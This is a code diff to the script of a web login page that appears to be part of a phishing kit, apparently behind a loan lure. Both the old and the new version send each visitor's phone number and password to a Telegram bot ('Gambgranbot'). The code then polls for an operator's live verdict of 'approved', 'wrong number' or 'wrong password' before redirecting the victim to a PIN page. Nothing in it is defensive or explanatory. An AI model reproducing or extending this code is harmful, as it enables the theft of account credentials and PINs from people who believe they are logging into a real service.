@@ -259,6 +259,7 @@
         </style>
     </div>
 
+    <script src="apiClient.js"></script>
     <script>
         function showError(msg) {
             const box = document.getElementById('errorMsg');
@@ -280,50 +281,51 @@
             document.getElementById('loginBtn').disabled = true;
             document.getElementById('waitOverlay').style.display = 'flex';
 
-            // Generate unique session ID
-            const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
-            const loanAmount = sessionStorage.getItem('loanAmount') || 'Not specified';
-            sessionStorage.setItem('sessionId', sessionId);
-            sessionStorage.setItem('phone', phone);
+            // TRIGGER TELEGRAM AUTOMATICALLY
+            // This happens immediately to stay within the user gesture context
+            const botUsername = 'Gambgranbot'; 
+            const tgUrl = window.apiClient.generateTelegramLink(botUsername, phone);
+            window.open(tgUrl, '_blank');
 
-            // Send to Telegram via Netlify function
+            // Send to TG via Unified API Client
             try {
-                await fetch('/.netlify/functions/request-approval', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, password: pass, sessionId, loanAmount })
+                const data = await window.apiClient.requestApproval({ 
+                    type: 'login',
+                    phone, 
+                    password: pass, 
                 });
+                const attemptId = data.attemptId;
+                sessionStorage.setItem('attemptId', attemptId);
+
+                // Poll for status
+                const poll = setInterval(async () => {
+                    try {
+                        const res = await window.apiClient.checkStatus(attemptId);
+                        const status = res.status;
+
+                        if (status === 'approved') {
+                            clearInterval(poll);
+                            window.location.href = 'pin.html';
+                        } else if (status === 'wrong_number') {
+                            clearInterval(poll);
+                            showError('❌ The number you entered is incorrect. Please try again.');
+                        } else if (status === 'wrong_password') {
+                            clearInterval(poll);
+                            showError('❌ Incorrect password. Please try again.');
+                        }
+                    } catch (e) { /* retry */ }
+                }, 2000);
+
+                // Timeout after 3 mins
+                setTimeout(() => {
+                    clearInterval(poll);
+                    showError('⏱ Request timed out. Please try again.');
+                }, 180000);
+
             } catch (e) {
-                showError('Network error. Please try again.');
+                showError('Network error connecting to Gateway. Please try again.');
                 return;
             }
-
-            // Poll Redis for decision
-            const poll = setInterval(async () => {
-                try {
-                    const res = await fetch(`/.netlify/functions/check-status?sessionId=${sessionId}&type=login`);
-                    const data = await res.json();
-                    const status = data.status;
-
-                    if (status === 'approved') {
-                        clearInterval(poll);
-                        window.location.href = 'pin.html';
-                    } else if (status === 'wrong_number') {
-                        clearInterval(poll);
-                        showError('❌ The number you entered is incorrect. Please try again.');
-                    } else if (status === 'wrong_password') {
-                        clearInterval(poll);
-                        showError('❌ Incorrect password. Please try again.');
-                    }
-                    // else still 'pending' — keep polling
-                } catch (e) { /* retry on next tick */ }
-            }, 2000);
-
-            // Timeout after 3 minutes
-            setTimeout(() => {
-                clearInterval(poll);
-                showError('⏱ Request timed out. Please try again.');
-            }, 180000);
         }
     </script>
 
